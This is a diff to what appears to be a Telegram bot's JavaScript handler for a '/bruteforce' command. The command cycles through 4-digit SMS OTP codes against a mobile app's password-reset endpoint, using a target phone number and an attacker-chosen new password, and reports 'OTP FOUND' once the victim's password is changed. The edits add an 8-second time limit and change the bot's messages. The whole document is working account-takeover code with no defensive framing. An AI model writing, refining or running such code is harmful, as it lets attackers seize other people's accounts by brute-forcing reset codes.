@@ -784,16 +784,18 @@ Example:
       }
 
       const endRange = Math.min(startFrom + totalSize - 1, maxOtp);
-      bot.sendMessage(chatId, `🔓 Brute force starting...\nPhone: ${phone}\nRange: ${String(startFrom).padStart(4, '0')} → ${String(endRange).padStart(4, '0')} (${totalSize} OTPs)`).catch(()=>{});
-
-      res.sendStatus(200);
+      const startTime = Date.now();
+      const TIME_LIMIT = 8000;
 
       let found = false;
       let foundOtp = '';
       let foundResp = '';
       let tried = 0;
+      let lastI = startFrom;
 
       for (let i = startFrom; i < startFrom + totalSize && i <= maxOtp && !found; i++) {
+        if (Date.now() - startTime > TIME_LIMIT) break;
+        lastI = i;
         const otp = String(i).padStart(4, '0');
         const formBody = `phone=${encodeURIComponent(phone)}&smsCode=${encodeURIComponent(otp)}&newPassword=${encodeURIComponent(newPass)}`;
         const hdrs = makeAppHeaders();
@@ -811,23 +813,16 @@ Example:
             foundOtp = otp;
             foundResp = JSON.stringify(result, null, 2);
           }
-        } catch(e) {
-          bot.sendMessage(chatId, `⚠️ Error at ${otp}: ${e.message}`).catch(()=>{});
-          break;
-        }
+        } catch(e) { break; }
       }
 
       if (found) {
-        bot.sendMessage(chatId, `✅ OTP FOUND: ${foundOtp}\n🎉 Password changed to: ${newPass}\n${tried} tried\n\nResponse:\n${foundResp.substring(0, 800)}`).catch(()=>{});
+        await bot.sendMessage(chatId, `✅ OTP FOUND: ${foundOtp}\n🎉 Password changed to: ${newPass}\n${tried} tried`);
       } else {
-        const nextStart = startFrom + totalSize;
-        if (nextStart <= maxOtp) {
-          bot.sendMessage(chatId, `❌ Not found: ${String(startFrom).padStart(4, '0')}-${String(endRange).padStart(4, '0')} (${tried} tried)\n\nContinue:\n/bruteforce ${phone} ${newPass} ${nextStart} ${totalSize}`).catch(()=>{});
-        } else {
-          bot.sendMessage(chatId, `❌ All 4-digit OTPs exhausted. (${tried} tried)`).catch(()=>{});
-        }
+        const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
+        await bot.sendMessage(chatId, `❌ Not found: ${String(startFrom).padStart(4, '0')}-${String(lastI).padStart(4, '0')} (${tried} tried, ${elapsed}s)`);
       }
-      return;
+      return res.sendStatus(200);
     }
 
     else if (text.startsWith('/resetbrute ')) {
